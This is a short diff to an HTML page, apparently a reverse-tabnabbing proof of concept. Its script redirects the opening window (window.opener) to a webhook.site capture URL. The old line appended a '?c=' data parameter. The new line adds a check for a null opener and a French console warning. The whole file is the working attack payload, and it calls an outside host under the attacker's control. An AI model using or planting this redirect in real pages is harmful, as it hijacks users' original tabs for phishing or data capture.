@@ -4,7 +4,11 @@
 <body>
 
     <script>
-        window.opener.location.href = "https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=";
+        if (window.opener) {
+    window.opener.location.href = "https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493";
+} else {
+    console.warn("opener est null (noopener actif ou ouverture directe)");
+}
     </script>
 </body>
 
